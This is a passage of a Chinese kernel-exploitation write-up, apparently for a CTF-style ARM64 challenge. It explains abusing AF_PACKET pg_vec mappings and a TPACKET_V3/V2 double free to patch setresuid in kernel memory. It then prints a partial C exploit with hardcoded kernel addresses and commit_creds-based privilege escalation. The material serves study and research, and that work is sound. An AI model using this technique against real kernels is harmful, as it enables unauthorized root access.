vma, prev, rb_link, rb_parent);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    file = vma-&gt;vm_file;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在最开始的<code>socket</code>介绍中知道<code>packet_ops</code>调用的<code>ops-&gt;mmap</code>为<code>packet_mmap()</code>,<code>packet_mmap()</code>会将<code>pg_vec</code>中的<code>pages</code>对应的物理页面与用户程序的<code>vma</code>绑定，也就是将网络数据包的接收和发送缓冲区映射到用户空间。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//套接字的映射</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">packet_mmap</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">struct</span> socket *sock,</span></span><br><span class="line"><span class="params">        <span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    start = vma-&gt;vm_start;</span><br><span class="line">    <span class="keyword">for</span> (rb = &amp;po-&gt;rx_ring; rb &lt;= &amp;po-&gt;tx_ring; rb++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (rb-&gt;pg_vec == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">//pg_vec存储着连续的虚拟地址，现在循环遍历将这些虚拟地址代表的物理页面映射到用户态</span></span><br><span class="line">        <span class="comment">//然后用户态的时候就能对物理页面直接进行读写</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; rb-&gt;pg_vec_len; i++) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">            <span class="type">void</span> *kaddr = rb-&gt;pg_vec[i].buffer;</span><br><span class="line">            <span class="type">int</span> pg_num;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (pg_num = <span class="number">0</span>; pg_num &lt; rb-&gt;pg_vec_pages; pg_num++) &#123;</span><br><span class="line">                page = pgv_to_page(kaddr);</span><br><span class="line">                err = vm_insert_page(vma, start, page);</span><br><span class="line">                <span class="keyword">if</span> (unlikely(err))</span><br><span class="line">                    <span class="keyword">goto</span> out;</span><br><span class="line">                start += PAGE_SIZE;</span><br><span class="line">                kaddr += PAGE_SIZE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>mmap</code>的时候可以映射<code>socket</code>的环形缓冲区到用户态，环形缓冲区在<code>setsockopt</code>的时候用<code>pg_vec</code>构造，使用<code>GPF_KERNEL</code>来申请的<code>object</code>，并且大小可控，这个时候通过堆块的漏洞去控制<code>pg_vec</code>的虚拟地址，然后再映射到用户态就可以对任意内核地址的控制。</p>
<p>调用链：<code>vm_insert_page()-&gt;insert_page()-&gt;validate_page_before_insert()</code>的时候会对<code>page</code>进行检查，检查<code>page</code> 是否为匿名页,是否为子系统分配的页，是否含有<code>type</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">validate_page_before_insert</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//Anon匿名页 Slab子系统分配的页 page是否含有type</span></span><br><span class="line">    <span class="keyword">if</span> (PageAnon(page) || PageSlab(page) || page_has_type(page))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    flush_dcache_page(page);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">page_has_type</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>)page-&gt;page_type &lt; PAGE_MAPCOUNT_RESERVE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>内存页的<code>type</code>为以下四种。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//linux-5.11.1\include\linux\page-flags.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAPCOUNT_RESERVE   -128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PG_buddy    0x00000080  <span class="comment">//伙伴系统页</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PG_offline  0x00000100  <span class="comment">//内存交换出去的页</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PG_table    0x00000200  <span class="comment">//页表的页</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PG_guard    0x00000400  <span class="comment">//内存屏障的页</span></span></span><br></pre></td></tr></table></figure></div>

<p>如果传入的<code>page</code>为内核代码的页，以上检查都可以绕过，就可以利用<code>pg_vec</code>修改内核代码段，这个时候传入<code>__sys_setresuid</code>&#x2F;<code>SyS_setresuid</code>的内核代码页的虚拟地址，然后对逻辑判断处改为<code>jmp</code>&#x2F;<code>bl</code>跳转就可以完成提权。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( !ns_capable(old-&gt;user_ns, <span class="number">7</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ruid_1 != <span class="number">-1</span> &amp;&amp; ruid_1 != old-&gt;uid.val &amp;&amp; ruid_1 != old-&gt;euid.val &amp;&amp; (fixed_1 = <span class="number">-1</span>, ruid_1 != old-&gt;suid.val)</span><br><span class="line">      || euid_1 != <span class="number">-1</span> &amp;&amp; euid_1 != old-&gt;uid.val &amp;&amp; euid_1 != old-&gt;euid.val &amp;&amp; (fixed_1 = <span class="number">-1</span>, euid_1 != old-&gt;suid.val)</span><br><span class="line">      || suid_1 != <span class="number">-1</span> &amp;&amp; suid_1 != old-&gt;uid.val &amp;&amp; suid_1 != old-&gt;euid.val &amp;&amp; (fixed_1 = <span class="number">-1</span>, suid_1 != old-&gt;suid.val) )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_24:</span><br><span class="line">      abort_creds(new);</span><br><span class="line">      <span class="keyword">return</span> fixed_1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路-17"><a href="#利用思路-17" class="headerlink" title="利用思路"></a>利用思路</h3><p><strong>总结</strong></p>
<p><code>setsockopt()</code>调用<code>packet_set_ring()</code>时，版本为<code>TPACKET_V3</code>会通过<code>init_prb_bdqc()</code>对接收环进行初始化时，<code>packet_ring_buffer.prb_bdqc.pkbdq</code>持有一个<code>pg_vec</code>引用，并且后期释放操作并没有对该位置进行清除。进而版本转换为<code>TPACKET_V2</code>时，<code>rx_owner_map</code>和<code>prb_bdqc</code>为一个联合体，并且偏移一致，导致残留的<code>pg_vec</code>会变成<code>rx_owner_map</code>指针，导致最后释放操作的时候，造成<code>doble free</code>。</p>
<ol>
<li>调用<code>socket</code>创建套接字,<code>family</code>为<code>AF_PACKET</code>，<code>type</code>为<code>SOCK_RAW</code>。</li>
<li>调用<code>TPACKET_V3</code>的<code>setsockopt</code>,创建环形缓冲区。</li>
<li>再次调用<code>setsockopt</code>，版本号还是<code>TPACKET_V3</code>，设置<code>req-&gt;tp_block_nr</code>为<code>0</code>，会释放第一次申请的缓冲区。</li>
<li>使用堆喷等手法申请回释放的<code>pg_vec</code></li>
<li>调用<code>TPACKET_V2</code>的<code>setsockopt</code>，实现<code>double free</code></li>
<li>劫持<code>pg_vec</code>指向内核地址，然后 <code>patch</code> 内核即可。</li>
</ol>
<h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/param.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/ethernet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #include &lt;linux/userfaultfd.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">    <span class="type">size_t</span> *buf;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*prepare_kernel_cred)(<span class="type">void</span> *) = (<span class="type">void</span> *)<span class="number">0xFFFFFFC0000BEB60</span>;</span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *) = (<span class="type">void</span> *)<span class="number">0xFFFFFFC0000BE5A0</span>;</span><br><span class="line"><span class="type">void</span> *(*set_memory_rw)(<span class="type">void</span>* addr, <span class="type">int</span> numpages) = (<span class="type">void</span> *)<span class="number">0xFFFFFFC000095360</span>;</span><br><span class="line"><span class="type">size_t</span> SyS_setresuid_page_offset = <span class="number">0xD50</span>;</span><br><span class="line"><span class="type">size_t</span> SyS_setresuid_page_base = <span class="number">0xFFFFFFC0000B0C90</span> &amp; ~<span class="number">0xFFF</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFC0008EA998</span>;</span><br><span class="line"><span class="type">size_t</span> ret_to_usr = <span class="number">0xFFFFFFC000085554</span>;</span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xFFFFFFC0008E9A40</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_MALLOC 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_FREE 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_WRITE 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_READ 9</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> param* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kmalloc len:%lu idx:%lld\n&quot;</span>, p-&gt;len, p-&gt;idx);</span><br><span class="line">    ioctl(fd, BOF_MALLOC, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> param* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kfree len:%lu idx:%lld\n&quot;</span>, p-&gt;len, p-&gt;idx);</span><br><span class="line">    ioctl(fd, BOF_FREE, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> param* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] copy_to_user len:%lu idx:%lld\n&quot;</span>, p-&gt;len, p-&gt;idx);</span><br><span class="line">    ioctl(fd, BOF_READ, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> param* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] copy_from_user len:%lu idx:%lld\n&quot;</span>, p-&gt;len, p-&gt;idx);</span><br><span class="line">    ioctl(fd, BOF_WRITE, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> * flag = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> fd = open(flag, O_RDWR);</span><br><span class="line">    read(fd, buffer, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] flag: %s\n&quot;</span>, buffer);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_sp, user_pc;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov %0, sp\n\t&quot;</span></span></span><br><span class="line"><span class="params">        : <span class="string">&quot;=r&quot;</span>(user_sp)</span></span><br><span class="line"><span class="params">        :</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;memory&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    user_pc = (<span class="type">size_t</span>)get_shell;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Saved SP: %p\n&quot;</span>, (<span class="type">void</span>*)user_sp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="comment">// 准备返回用户态的处理器状态</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov    x0, #0x0\n&quot;</span>                  <span class="comment">// 清空x0</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov    x1, #0x3c0\n&quot;</span>                <span class="comment">// PSTATE: EL0t, 中断使能</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;msr    spsr_el1, x1\n&quot;</span>              <span class="comment">// 设置保存的程序状态寄存器</span></span></span><br><span class="line"><span class="params">        </span></span><br><span class="line"><span class="params">        <span class="comment">// 恢复用户态栈指针</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;msr    sp_el0, %0\n&quot;</span>                <span class="comment">// 恢复用户栈指针</span></span></span><br><span class="line"><span class="params">        </span></span><br><span class="line"><span class="params">        <span class="comment">// 设置返回地址</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;msr    elr_el1, %1\n&quot;</span>               <span class="comment">// 设置异常链接寄存器</span></span></span><br><span class="line"><span class="params">        </span></span><br><span class="line"><span class="params">        <span class="comment">// 返回用户态</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;eret\n&quot;</span>                             <span class="comment">// Exception Return</span></span></span><br><span class="line"><span class="params">        :</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;r&quot;</span>(user_sp), <span class="string">&quot;r&quot;</span>(user_pc)         <span class="comment">// 传入用户栈和返回地址</span></span></span><br><span class="line"><span class="params">        : <span class="string">&quot;memory&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NONE         <span class="string">&quot;\033[m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED          <span class="string">&quot;\033[0;32;31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIGHT_RED    <span class="string">&quot;\033[1;31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN        <span class="string">&quot;\033[0;32;32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIGHT_GREEN  <span class="string">&quot;\033[1;32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE         <span class="string">&quot;\033[0;32;34m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIGHT_BLUE   <span class="string">&quot;\033[1;34m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DARY_GRAY    <span class="string">&quot;\033[1;30m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CYAN         <span class="string">&quot;\033[0;36m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIGHT_CYAN   <span class="string">&quot;\033[1;36m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE       <span class="string">&quot;\033[0;35m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIGHT_PURPLE <span class="string">&quot;\033[1;35m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BROWN        <span class="string">&quot;\033[0;33m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW       <span class="string">&quot;\033[1;33m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIGHT_GRAY   <span class="string">&quot;\033[0;37m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE        <span class="string">&quot;\033[1;37m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) 